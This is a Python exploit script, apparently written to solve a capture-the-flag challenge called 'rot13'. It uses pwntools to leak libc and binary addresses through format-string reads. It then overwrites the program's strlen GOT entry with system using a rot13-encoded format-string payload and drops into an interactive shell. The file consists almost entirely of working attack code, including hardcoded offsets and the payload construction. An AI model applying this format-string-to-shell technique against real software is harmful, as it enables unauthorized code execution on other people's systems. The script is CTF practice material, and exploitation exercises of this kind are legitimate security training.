from pwn import *
import string

rot13 = string.maketrans( 
    "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", 
    "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")



r = process(["./rot13"],env={"LD_PRELOAD":"./rot13-libc.so"})

#r  = remote("chal1.sunshinectf.org", 20006)
#r.sendlineafter(":","%c "*300)
r.sendlineafter(":","%283$c")

r.recvuntil(":")
r.recvuntil(":")

libc  = int(r.recvline()[1:-1],16)


print hex(libc)

r.sendlineafter(":","%3$c")

r.recvuntil(":")

text  = int(r.recvline()[1:-1],16)-0x95b
strlen = text + 0x1fd8

print hex(text)

system = 0x003ada0 + libc
target = strlen

print hex(target)


payload = fmtstr_payload(7, {target:system}, numbwritten=0)
payload = string.translate(payload, rot13)

payload = string.translate(p32(target),rot13)+" %7$f"


r.sendlineafter(":",payload)
r.recvuntil(": ")
r.recvuntil(" ")
libc =  u32(r.recv(4))-0x0018540

print hex(libc)
system = 0x003ada0 + libc
target = text+0x0001fd4
payload = fmtstr_payload(7, {target:system}, numbwritten=0)
payload = string.translate(payload, rot13)

r.sendlineafter(":",payload)

r.interactive()
